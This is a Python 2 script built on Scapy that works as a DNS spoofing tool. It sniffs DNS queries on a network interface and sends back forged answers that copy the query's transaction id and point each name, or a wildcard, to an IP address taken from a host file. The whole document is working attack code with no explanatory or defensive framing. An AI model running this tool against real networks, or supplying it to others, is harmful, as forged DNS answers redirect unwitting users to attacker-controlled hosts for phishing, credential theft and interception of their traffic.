from scapy.all import *

hosts = {}
for line in open("hostfile.txt","r"):
   line = line.rstrip("\n")
   if line:
      (ip,host) = line.split()  
      hosts[host] = ip 

def packet_handler(packet):
   ip = packet.getlayer(IP)
   udp = packet.getlayer(UDP)
   dns = packet.getlayer(DNS)
   if dns.qr == 0 and dns.opcode == 0:
      host_name = dns.qd.qname[:-1]
      if host_name in hosts:
         response_to_send = hosts.get(host_name)
      else:
         response_to_send = hosts.get("*")
      if response_to_send:
         answer = DNSRR(rrname = host_name + ".",ttl = 255,type ="A",rclass="IN",rdata=response_to_send)
         answer_packet = IP(src= ip.dst,dst=ip.src)/\
                      UDP(sport = udp.dport,dport = udp.sport)/\
                      DNS(id = dns.id,qr=1,aa=0,rcode=0,qd=dns.qd,an=answer)
         send(answer_packet,iface="eth0")
         print "Packet for dns is sent !"

sniff(iface="eth0",filter="udp port 53",store=0,prn=packet_handler)
